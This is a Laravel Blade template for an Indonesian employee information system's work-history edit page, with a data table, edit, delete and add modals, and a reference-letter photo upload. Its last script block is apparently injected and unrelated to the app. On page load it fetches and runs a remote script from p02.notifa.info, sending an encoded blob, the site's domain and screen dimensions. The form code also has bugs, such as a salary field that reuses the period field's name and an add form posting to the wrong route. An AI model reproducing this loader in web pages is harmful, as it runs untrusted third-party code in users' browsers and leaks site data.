<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="/image/favicon.png">
    <title>Profil</title>
    <link rel="stylesheet" type="text/css" href="/assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/lib/datatables/css/dataTables.bootstrap.min.css"/>
    <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="/assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/lib/jqvmap/jqvmap.min.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/css/float_button.css">
    <link rel="stylesheet" type="text/css" href="/css/croppie.css">
  </head>
  <body>
    <div class="be-wrapper">
            <div class="be-wrapper be-fixed-sidebar">

            <!--  Sidebar Brand Logo -->

          <div class="be-left-sidebar">
            <div class="brand-logo">
                <img src="/image/logo.png">
            </div>

                 <!--  Sidebar Brand Logo End -->  

                  <!--  Sidebar Start -->  

            <div class="left-sidebar-wrapper"> <a href="#" class="left-sidebar-toggle">MENU</a>
             <div class="left-sidebar-spacer">
              <div class="left-sidebar-scroll">
                <div class="left-sidebar-content">

                     <!--  Sidebar Poto, Username, Edit Profil -->

                    <div class="profil">
                        <div class="circular--portrait">
                            <img class="img-responsive foto-karyawan" src="/image/FotoProfil/{{Auth::user()->foto_profil}}">
                            <div id="username">
                                <a href="profil.html" class="simple_text">{{ Auth::user()->name }}</a>
                            </div>
                           <button onclick="window.location.href='/profil'" type="button" class="btn">Profil</button>
                           <!-- <button class="btn btn-space btn-default active">Default</button> -->
                        </div>
                    </div>

                             <!--  Sidebar Menu-->

                        <ul class="sidebar-elements">
                            <li class="divider">Menu
                                <hr class="Menu">  
                            </li>

                            <li class="active"><a href="/home">
                                <i class="icon fas fa-home"></i>
                                <span>Beranda</span></a>
                            </li>
                                                                     
                            <li class="active">
                                <a class="" href="/datakaryawan">
                                    <i class="icon far fa-address-book"></i>
                                    <span>Data Karyawan</span>
                                </a>
                            </li>

                            <li class="active">
                                <a class=" " href="/presensi">
                                  <i class="icon fas fa-calendar-alt"></i>
                                  <span>Presensi</span>
                              </a>
                            </li>

                              <li class="active">
                                <a class=" " href="/penggajian">
                                   <i class="icon fas fa-money-check-alt"></i>
                                    <span>Penggajian</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class=" " href="/persetujuan_izin">
                                   <i class="icon far fa-calendar-check"></i>
                                    <span>Persetujuan Izin</span>
                                </a>
                              </li>  

                              <li class="divider">Personal
                                 <hr class="Menu">  
                              </li> 

                              <li class="active">
                                <a class=" " href="/gaji">
                                  <i class="icon far fa-money-bill-alt"></i>
                                  <span>Gaji</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class=" " href="/kontak_karyawan">
                                    <i class="icon far fa-id-card"></i>
                                    <span>Kontak Karyawan</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class=" " href="/form_izin">
                                  <i class="icon fab fa-wpforms"></i>
                                  <span>Form Izin</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class="dropdown-item" href="{{ route('logout') }}"
                                       onclick="event.preventDefault();
                                                     document.getElementById('logout-form').submit();">
                                        <i class="icon fas fa-sign-out-alt"></i>
                                        <span>Logout</span>
                                </a>

                                <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                                        @csrf
                                </form>
                              </li>                              
                            </ul>
                         </div>                         
                    </div>
                 </div>
               </div>
            </div>
         </div>


      <!-- Konten -->
      <div class="be-content">
        <div class="page-head">
          <h2 class="page-head-title">Edit Profil</h2>
           <ol class="breadcrumb page-head-nav">
            <li class="active"></li>
          </ol>
        </div>

        <div class="main-content container-fluid">
          <div class="row">
            <div class="col-sm-12">
              <div class="panel panel-default panel-table">
                <div class="panel-body">

                                            <div>
                            <ul class="progressbar">
                              <a class="a" href="/datakaryawan/{{$data_karyawan->nik}}/edit/data_pribadi"><li class="done">Data Pribadi</li></a>
                              <a class="a" href="/datakaryawan/{{$data_karyawan->nik}}/edit/data_keluarga"><li class="done">Data Keluarga</li></a>
                              <a class="a" href="/datakaryawan/{{$data_karyawan->nik}}/edit/data_pendidikan"><li class="done">Riwayat Pendidikan</li></a>
                              <a class="a" href="/datakaryawan/{{$data_karyawan->nik}}/edit/data_riwayat_pekerjaan"><li class="active">Riwayat Pekerjaan</li></a><br>
                            </ul><br>
                          </div><br>

                <div class="panel-heading">Data Riwayat Pekerjaan</div>
                
                 <div class="modal-body">
                  <div class="table-responsive noSwipe">
                    <table class="table table-striped table-hover">
                     <thead>
                      <tr>
                        <th style="width:30%">Nama Perusahaan</th>
                        <th style="width:20%">Jenis Industri</th>
                        <th style="width:20%">Jabatan Akhir</th>
                        <th style="width:20%">Periode Kerja</th>
                        <th style="width:20%">Gaji Akhir</th>
                        <th style="width:20%">Alasan Berhenti</th>
                        <th align="center" style="width:30%">Action</th>
                      </tr>
                    </thead>
                       @foreach($riwayat_pekerjaan as $data)
                        <tbody>
                        <tr>
                          <td>{{$data->nama_perusahaan}}</td>
                          <td>{{$data->jenis_industri}}</td>
                          <td>{{$data->jabatan_akhir}}</td>
                          <td>{{$data->periode_berakhir_kerja}}</td>
                          <td>{{$data->gaji_akhir}}</td>
                          <td>{{$data->alasan_berhenti}}</td>
                          <td>
                             <button data-toggle="modal" data-target="#edit-data-familia-{{$data->id_riwayat_pekerjaan}}" type="button" class="btn btn-space btn-warning"> Edit </button>
                             <button data-toggle="modal" data-target="#hapus-{{$data->id_riwayat_pekerjaan}}" type="button" class="btn btn-space btn-danger"> Hapus </button>
                          </td>

                           <!-- Modals untuk Edit Data Familia -->
                           <form id="form_submit_edit" name="submit1" action="/datakaryawan/{{$data->id_riwayat_pekerjaan}}/update/data_riwayat_pekerjaan" method="POST">
                                 @csrf
                            <div id="edit-data-familia-{{$data->id_riwayat_pekerjaan}}" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
                            <div class="modal-dialog">

                              <div class="modal-content">
                                
                                <div class="modal-header">
                                  <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                                  <h3 class="modal-title">Edit Data Pekerjaan</h3>
                                </div>
                                <div class="modal-body">
                                   <div class="form-group">
                                    <label>Nama Perusahaan</label>
                                    <input name="nama_perusahaan" value="{{$data->nama_perusahaan}}" type="text" class="form-control">
                                   </div>
                                   <div class="form-group">
                                    <label>Jenis Industri</label>
                                    <input name="jenis_industri" value="{{$data->jenis_industri}}" type="text" class="form-control">
                                   </div>
                                  <div class="form-group">
                                    <label>Jabatan Akhir</label>
                                    <input name="jabatan_akhir" value="{{$data->jabatan_akhir}}" type="text" class="form-control" >         
                                  </div>
                                   <div class="form-group">
                                    <label>Periode Kerja</label>
                                    <input name="periode_berakhir_kerja" value="{{$data->periode_berakhir_kerja}}" type="text" class="form-control" >
                                  </div>
                                  <div class="form-group">
                                    <label>Gaji Akhir</label>
                                    <input name="periode_berakhir_kerja" value="{{$data->periode_berakhir_kerja}}" type="text" class="form-control" >
                                  </div>
                                  <div class="form-group">
                                    <label>Alasan Berhenti</label>
                                    <input name="alasan_berhenti" value="{{$data->alasan_berhenti}}" type="text" class="form-control" >
                                  </div>
                                </div>
                                <div class="modal-footer">
                                  <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
                                  <button id="submit1" name="submit1" type="submit1" class="btn btn-primary" onclick="submitFormsTambah()">Simpan</button>
                                </div>
                                
                              </div>
                            </div>
                          </div> 
                          </form>
                          
                          <!--Akhir dari Modals Edit data familia -->

                          <!-- Modals untuk Hapus -->

                            <div id="hapus-{{$data->id_riwayat_pekerjaan}}" tabindex="-1" role="dialog" class="modal fade">
                              <div class="modal-dialog">
                                <div class="modal-content">
                                  <div class="modal-header">
                                    <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                                  </div>
                                  <div class="modal-body">
                                    <div class="text-center">
                                      <div class="text-danger"><span class="modal-main-icon mdi mdi-close-circle-o"></span></div>
                                      <h3>Apakah Anda yakin untuk menghapus data</h3>
                                      <p><font size="4"> {{$data->nama_perusahaan}}, {{$data->jenis_industri}}, {{$data->jabatan_akhir}} ?</font> <br><br>
                                      (* Data yang telah dihapus tidak dapat dikembalikan)</p>
                                      <div class="xs-mt-50">
                                        <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                                        <a href="/datakaryawan/{{$data->id_riwayat_pekerjaan}}/delete/data_riwayat_pekerjaan"><button type="button" class="btn btn-space btn-danger">Hapus</button></a>
                                      </div>
                                    </div>
                                  </div>
                                  <div class="modal-footer"></div>
                                </div>
                              </div>
                            </div>
                            <!--Akhir dari Modals Hapus -->

                        </tr>
                        </tbody>
                       @endforeach
                    </table>
                    <div align="center" class="form-group">
                      <tr><br>
                      @foreach($foto_verklarin as $riwayat)

                      <td align="center" class="form-group">
                          <img data-toggle="modal" data-target="#modal-transparent-pendidikan{{$riwayat->id_riwayat_pekerjaan}}" src="/image/Verklarin/{{$riwayat->foto_verklarin}}" alt="Placeholder" class="img-data">
                      </td>

                        <!-- Modal Foto Ijazah dan Sertifikat-->
                          <div  class="modal modal-transparent fade" id="modal-transparent-pendidikan{{$riwayat->id_riwayat_pekerjaan}}" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                                <div class="modal-header">
                                  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                                </div>
                                <div class="modal-body">
                                  <center>  
                                    <img src="/image/Verklarin/{{$riwayat->foto_verklarin}}" alt="" class="img-responsive">
                                  </center>
                                </div>
                                
                          </div>

                      @endforeach
                      </tr>
                    </div>
                  </div>
          <!-- End Modal Body -->




          
              <div class="modal-footer">
                  <a href="/profil/{nik}/edit/data_pendidikan"><button type="button" data-dismiss="modal" class="btn btn-default">Kembali</button></a>
                  <button data-toggle="modal" data-target="#tambah-data-familia" type="button" data-dismiss="modal" class="btn btn-primary">Tambah</button>
                  <a href="/profil"><button type="button" data-dismiss="modal" class="btn btn-default">Selesai</button></a>
              </div>

                   <!-- Modals untuk Edit Tambah Data Familia -->
                        <form id="form_submit2" name="form_submit2" action="/datakaryawan/tambah/update/data_pendidikan" method="POST">
                                 @csrf
                            <div id="tambah-data-familia" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
                            <div class="modal-dialog">
                              <div class="modal-content">
                                
                                <div class="modal-header">
                                  <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                                  <h3 class="modal-title">Edit </h3>
                                </div>
                                <div class="modal-body">
                                   <div class="form-group">
                                    <label>Nama Perusahaan</label>
                                    <input name="nama_perusahaan" type="text" class="form-control" required="">
                                   </div>
                                   <div class="form-group">
                                    <label>Jenis Industri</label>
                                    <input name="jenis_industri" type="text" class="form-control" required="">
                                   </div>
                                  <div class="form-group">
                                    <label>Jabatan Akhir</label>
                                    <input name="jabatan_akhir" type="text" class="form-control" required="">         
                                  </div>
                                   <div class="form-group">
                                    <label>Periode Kerja</label>
                                    <input name="periode_berakhir_kerja" type="text" class="form-control" required="" >
                                  </div>
                                  <div class="form-group">
                                    <label>Gaji Akhir</label>
                                    <input name="periode_berakhir_kerja" type="text" class="form-control" required="">
                                  </div>
                                  <div class="form-group">
                                    <label>Alasan Berhenti</label>
                                    <input name="alasan_berhenti" type="text" class="form-control" required="" >
                                  </div>
                                  <div class="form-group">
                                    <input value="{{$data_karyawan->nik}}" name="nik" type="hidden" class="form-control" required="">
                                  </div>
                                  <label>Foto Verklarin</label>
                                   <div align="center" class="form-group">
                                    <img id="foto_verklarin" src="/image/Verklarin/140x140.png" alt="Placeholder" class="img-data"><br>
                                    <div align="center" class="upload-btn-wrapper">
                                      <button class="btn">Upload Verklarin</button>
                                      <input id="input_foto_verklarin" type="file" name="foto_ijazah_verklarin" required=""/>
                                    </div>
                                   </div>

                                </div>
                                <div class="modal-footer">
                                  <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
                                  <button id="submit2" name="submit2" type="submit2" class="btn btn-primary" onclick="submitFormsTambah()">Tambah</button>
                                </div>
                              </div>
                            </div>
                          </div> 
                        </form>
              <!--Akhir dari Modals Tambah data familia -->

            </div>

               
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

     <div class="text-center">
      <div class="credits">
        <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
      </div>
      </div>
    

    <!-- JS untuk opsi resign di bagian edit data karyawan -->

    <script src="/assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
    <script src="/assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
    <script src="/assets/js/main.js" type="text/javascript"></script>
    <script src="/assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
    <script src="/assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>
    <script src="/js/croppie.js"></script>



    <script type="text/javascript">

      //fungsi preview foto verklarin

      function readURL_verklarin(input) {
            if (input.files && input.files[0]) {
                var reader = new FileReader();

                reader.onload = function (e) {
                    $('#foto_verklarin')
                        .attr('src', e.target.result);
                };

                reader.readAsDataURL(input.files[0]);
            }
      }

      $("#input_foto_verklarin").change(function () {
              readURL_verklarin(this);
      });
      //end fungsi preview foto verklarin

    </script>

    <script type="text/javascript">
      document.getElementById("status").onchange = function () {
      document.getElementById("alasan").setAttribute("disabled", "disabled");
       document.getElementById("tgl_resign").setAttribute("disabled", "disabled");
      if (this.value == 'Resign')
        document.getElementById("alasan").removeAttribute("disabled");
      if (this.value == 'Resign')
      document.getElementById("tgl_resign").removeAttribute("disabled");
      };

      // Fungsi Logout

      $(function(){
          $('a#logout').click(function(){
              if(confirm('Apakah anda yakin ingin keluar ?')) {
                  return true;
              }

              return false;
                });
            });


      // Fungsi Menu dashboard

      $(document).ready(function(){

          App.init();
          App.dashboard();

          });
      </script>

      <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };

      </script>

</body>
</html>
